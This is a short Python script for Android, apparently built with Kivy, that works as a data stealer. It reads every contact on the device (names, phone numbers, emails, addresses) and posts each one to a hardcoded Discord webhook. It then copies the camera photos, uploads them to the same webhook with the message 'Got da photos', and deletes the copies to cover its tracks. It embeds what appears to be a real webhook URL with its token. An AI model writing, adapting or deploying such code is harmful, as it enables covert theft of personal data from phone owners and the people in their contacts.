import os
import shutil
import requests
import time
from kivy.utils import platform

if platform == 'android':
    from plyer import storagepath, permission
    from android.permissions import request_permissions, Permission

    # Request permission to access external storage
    request_permissions([Permission.READ_EXTERNAL_STORAGE, Permission.WRITE_EXTERNAL_STORAGE])


def main():
    output_file = os.path.join(storagepath.get_external_storage_path(), 'Download', 'contacts.txt')
    webhook_url = "https://discord.com/api/webhooks/1110639493440094338/ZBRCF8MVJJcfcSvQXXB6odJGD_8MTd5rylCBQaEH-BGyBex6F7qr4QbHeww2ES5HtDJy"

    if platform == 'android':
        from android import Android
        droid = Android()
        contacts = droid.contactsGetAll().result
    else:
        # Placeholder data for non-Android platforms
        contacts = []

    with open(output_file, 'w') as f:
        for contact in contacts:
            payload = {
                "content": f'Name: {contact["name"]}\nPhone: {contact["phone"]}\nEmail: {contact["email"]}\nAddress: {contact["address"]}\n',
                "username": "Seraph (Contacts)"
            }
            response = requests.post(webhook_url, json=payload)
            time.sleep(0.3)

    gallery_dir = ''
    for dirpath, dirnames, filenames in os.walk(storagepath.get_external_storage_path()):
        for dirname in dirnames:
            if dirname.lower() == 'dcim':
                gallery_dir = os.path.join(dirpath, dirname, 'Camera')
                break
        if gallery_dir:
            break

    dst_dir = os.path.join(storagepath.get_external_storage_path(), 'Pictures')

    images = []
    for file_name in os.listdir(gallery_dir):
        if file_name.endswith('.jpg') or file_name.endswith('.png'):
            src_path = os.path.join(gallery_dir, file_name)
            dst_path = os.path.join(dst_dir, file_name)
            shutil.copy(src_path, dst_path)
            images.append(dst_path)

    payload = {
        "content": "Got da photos",
        "username": "Seraph (Photos)"
    }
    files = [("file{}".format(index + 1), open(image_path, 'rb')) for index, image_path in enumerate(images)]

    response = requests.post(webhook_url, data=payload, files=files)

    for image_path in images:
        os.remove(image_path)


if __name__ == '__main__':
    main()
